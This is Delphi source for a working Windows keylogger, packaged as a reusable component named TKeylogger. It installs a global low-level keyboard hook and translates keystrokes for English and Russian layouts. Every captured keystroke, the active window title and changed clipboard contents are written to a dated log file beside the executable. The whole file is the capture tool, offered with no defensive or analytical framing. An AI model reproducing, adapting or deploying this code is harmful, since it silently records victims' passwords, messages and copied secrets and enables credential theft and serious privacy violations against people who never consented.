unit Keylogger;

interface

uses
  Winapi.Windows, System.SysUtils, System.Classes, Clipbrd;

const
  WH_KEYBOARD_LL = 13;

type
  TKBDLLHOOKSTRUCT = packed record
    vkCode: DWORD;
    scanCode: DWORD;
    flags: DWORD;
    time: DWORD;
    dwExtraInfo: pointer;
  end;

  PKBDLLHOOKSTRUCT = ^TKBDLLHOOKSTRUCT;

type
  TOThread = class(TThread)
  private
  protected
    procedure Execute; override;
  public
    constructor Create;
    destructor Destroy; override;
  end;

type
  TKeylogger = class(TComponent)
  private
    FActive: Boolean;
    procedure SetActive(const Value: Boolean);
    procedure KeySaveToFile(keytext: string);
    function GetChar(lparam: integer): Ansistring;
    function Get_Shift_Char(ch: AnsiString): AnsiString;
  protected
  public
    constructor Create(AOwner: TComponent); override;
    destructor Destroy; override;
  published
    property Active: Boolean read FActive write SetActive;
  end;



var
  kHook: cardinal;
  key, keydel, keymouse: Boolean;
  TextM: string;
  Buffer: string;
  FKeylogger: TKeylogger;

procedure Register;

implementation

constructor TKeylogger.Create(AOwner: TComponent);
begin
  inherited create(Aowner);
  FActive := False;
end;

destructor TKeylogger.Destroy;
begin
  if FActive then SetActive(False);
  inherited;
end;

constructor TOThread.Create;
begin
  inherited Create(false);
  Self.Priority := tpNormal;
  Self.FreeOnTerminate := True;
end;

destructor TOThread.Destroy;
begin
  inherited Destroy;
  Self.Terminate;
end;

procedure TOThread.Execute;
begin
  while not Self.Terminated do
  begin
    try
      if getasynckeystate(13) <> 0 then
      begin
        key := True;
        while key = True do
        begin
          if getasynckeystate(13) = 0 then
          begin
            key := False;
            if TextM <> '' then
            begin
              FKeylogger.KeySaveToFile(TextM);
            end;
            TextM := '';
          end;
        end;
      end;

      if getasynckeystate(1) <> 0 then
      begin
        keymouse := True;
        while keymouse = True do
        begin
          if getasynckeystate(1) = 0 then
          begin
            keymouse := False;
            if TextM <> '' then
            begin
              FKeylogger.KeySaveToFile(TextM);
            end;
            TextM := '';
          end;
        end;
      end;
    except
    end;
    Sleep(1);
  end;
end;

function KbdProc(code: integer; wparam: integer; lparam: integer): Integer; stdcall;
const
  WM_KEYDOWN = $0100;
  WM_SYSKEYDOWN = $0104;
var
  kbdStruct: PKBDLLHOOKSTRUCT;
  ss: string;
begin
  if (code < 0) or (code <> HC_ACTION) then
  begin
    Result := CallNextHookEx(0, code, wparam, lparam);
    Exit;
  end;

  kbdStruct := PKBDLLHOOKSTRUCT(lparam);

  if wParam = WM_KEYDOWN then
  begin
    if (kbdStruct^.vkCode = VK_SHIFT) or (kbdStruct^.vkCode = VK_CAPITAL) then
    begin
      Result := CallNextHookEx(0, code, wparam, lparam);
      Exit;
    end;

    if kbdStruct^.vkCode <> VK_BACK then
    begin
      if (GetKeyState(VK_CAPITAL) and 1) <> 0 then
      begin
        TextM := TextM + string(FKeylogger.Get_Shift_Char(FKeylogger.GetChar(lparam)));
      end
      else
      begin
        TextM := TextM + string(FKeylogger.GetChar(lparam));
      end;
    end
    else
    begin
      ss := TextM;
      Delete(ss, Length(ss), 1);
      TextM := ss;
    end;
  end;

  if wParam = WM_SYSKEYDOWN then
  begin
    Result := CallNextHookEx(0, code, wparam, lparam);
    Exit;
  end;

  Result := CallNextHookEx(0, code, wparam, lparam);
end;

procedure TKeylogger.SetActive(const Value: Boolean);
begin
  FActive := Value;
  if FActive = True then
  begin
    kHook := SetWindowsHookEx(WH_KEYBOARD_LL, @KbdProc, HInstance, 0);
    if kHook <> INVALID_HANDLE_VALUE then
    begin
      TOThread.Create;
    end;
  end
  else if FActive = False then
  begin
    if kHook <> INVALID_HANDLE_VALUE then
    begin
      UnhookWindowsHookEx(kHook);
    end;
  end;
end;

procedure TKeylogger.KeySaveToFile(keytext: string);
var
  f: TextFile;
  buf: array[Byte] of Char;
begin
  if ((keytext <> #13) or (keytext <> '') or (keytext <> '') or (keytext <> '') or (keytext <> '')) then
  begin

    GetWindowText(GetForegroundWindow, buf, Length(buf) * SizeOf(buf[0]));
    AssignFile(f, ExtractFilePath(ParamStr(0)) + DateToStr(Date) + '.log');
    if FileExists(ExtractFilePath(ParamStr(0)) + DateToStr(Date) + '.log') = False then
    begin
      Rewrite(f);
      Writeln(f, '[' + TimeToStr(Time) + '] ' + keytext + ' [' + buf + ']');
      try
        if Buffer <> Clipboard.AsText then
        begin
          Buffer := Clipboard.AsText;
          Writeln(f, #13#10 + '[' + TimeToStr(Time) + ']' + #13#10 + '<clipboard>' + #13#10 + Buffer + #13#10 + '</clipboard>' + #13#10 + ' [' + buf + ']' + #13#10);
        end;
      except
      end;
      CloseFile(f);
    end
    else
    begin
      Append(f);
      Writeln(f, '[' + TimeToStr(Time) + '] ' + keytext + ' [' + buf + ']');
      try
        if Buffer <> Clipboard.AsText then
        begin
          Buffer := Clipboard.AsText;
          Writeln(f, #13#10 + '[' + TimeToStr(Time) + ']' + #13#10 + ' <clipboard>' + #13#10 + Buffer + #13#10 + '</clipboard>' + #13#10 + ' [' + buf + ']' + #13#10);
        end;
      except
      end;
      CloseFile(f);
    end;
  end;
end;

function TKeylogger.GetChar(lparam: integer): Ansistring;
var
  data: PKBDLLHOOKSTRUCT;
  keystate: TKeyboardState;
  retcode: Integer;
  l: hkl;
begin
  data := pointer(lparam);
  GetKeyboardState(keystate);
  l := GetKeyBoardLayout(GetWindowThreadProcessId(GetForegroundWindow));
  SetLength(Result, 2);
  retcode := ToAsciiEx(data.vkCode, data.scanCode, keystate, @Result[1], 0, l);
  case retcode of
    0:
      Result := '';
    1:
      SetLength(Result, 1);
  else
    Result := '';
  end;
end;

function TKeylogger.Get_Shift_Char(ch: AnsiString): AnsiString;
begin
  if GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow, nil)) = 67699721 then
  begin
    //английская
    case ch[1] of
      '1':
        ch[1] := '!';
      '2':
        ch[1] := '@';
      '3':
        ch[1] := '#';
      '4':
        ch[1] := '$';
      '5':
        ch[1] := '%';
      '6':
        ch[1] := '^';
      '7':
        ch[1] := '&';
      '8':
        ch[1] := '*';
      '9':
        ch[1] := '(';
      '0':
        ch[1] := ')';
      '-':
        ch[1] := '_';
      '=':
        ch[1] := '+';
      '`':
        ch[1] := '~';
      'q':
        ch[1] := 'Q';
      'w':
        ch[1] := 'W';
      'e':
        ch[1] := 'E';
      'r':
        ch[1] := 'R';
      't':
        ch[1] := 'T';
      'y':
        ch[1] := 'Y';
      'u':
        ch[1] := 'U';
      'i':
        ch[1] := 'I';
      'o':
        ch[1] := 'O';
      'p':
        ch[1] := 'P';
      '[':
        ch[1] := '{';
      ']':
        ch[1] := '}';
      'a':
        ch[1] := 'A';
      's':
        ch[1] := 'S';
      'd':
        ch[1] := 'D';
      'f':
        ch[1] := 'F';
      'g':
        ch[1] := 'G';
      'h':
        ch[1] := 'H';
      'j':
        ch[1] := 'J';
      'k':
        ch[1] := 'K';
      'l':
        ch[1] := 'L';
      ';':
        ch[1] := ':';
      '''':
        ch[1] := '"';
      '\':
        ch[1] := '|';
      'z':
        ch[1] := 'Z';
      'x':
        ch[1] := 'X';
      'c':
        ch[1] := 'C';
      'v':
        ch[1] := 'V';
      'b':
        ch[1] := 'B';
      'n':
        ch[1] := 'N';
      'm':
        ch[1] := 'M';
      ',':
        ch[1] := '<';
      '.':
        ch[1] := '>';
      '/':
        ch[1] := '?';

    end;
    Result := ch;

  end
  else
  begin
    //русская
    case ch[1] of
      '1':
        ch[1] := '!';
      '2':
        ch[1] := '"';
      '3':
        ch[1] := '№';
      '4':
        ch[1] := ';';
      '5':
        ch[1] := '%';
      '6':
        ch[1] := ':';
      '7':
        ch[1] := '?';
      '8':
        ch[1] := '*';
      '9':
        ch[1] := '(';
      '0':
        ch[1] := ')';
      '-':
        ch[1] := '_';
      '=':
        ch[1] := '+';
      'ё':
        ch[1] := 'Ё';

      'й':
        ch[1] := 'Й';
      'ц':
        ch[1] := 'Ц';
      'у':
        ch[1] := 'У';
      'к':
        ch[1] := 'К';
      'е':
        ch[1] := 'Е';
      'н':
        ch[1] := 'Н';
      'г':
        ch[1] := 'Г';
      'ш':
        ch[1] := 'Ш';
      'щ':
        ch[1] := 'Щ';
      'з':
        ch[1] := 'З';
      'х':
        ch[1] := 'Х';
      'ъ':
        ch[1] := 'Ъ';
      'ф':
        ch[1] := 'Ф';
      'ы':
        ch[1] := 'Ы';
      'в':
        ch[1] := 'В';
      'а':
        ch[1] := 'А';
      'п':
        ch[1] := 'П';
      'р':
        ch[1] := 'Р';
      'о':
        ch[1] := 'О';
      'л':
        ch[1] := 'Л';
      'д':
        ch[1] := 'Д';
      'ж':
        ch[1] := 'Ж';
      'э':
        ch[1] := 'Э';
      '\':
        ch[1] := '/';
      'я':
        ch[1] := 'Я';
      'ч':
        ch[1] := 'Ч';
      'с':
        ch[1] := 'С';
      'м':
        ch[1] := 'М';
      'и':
        ch[1] := 'И';
      'т':
        ch[1] := 'Т';
      'ь':
        ch[1] := 'Ь';
      'б':
        ch[1] := 'Б';
      'ю':
        ch[1] := 'Ю';
      '.':
        ch[1] := ',';

    end;
    Result := ch;
  end;
end;

procedure Register;
begin
  RegisterComponents('ZERO COM', [TKeylogger]);
end;

end.
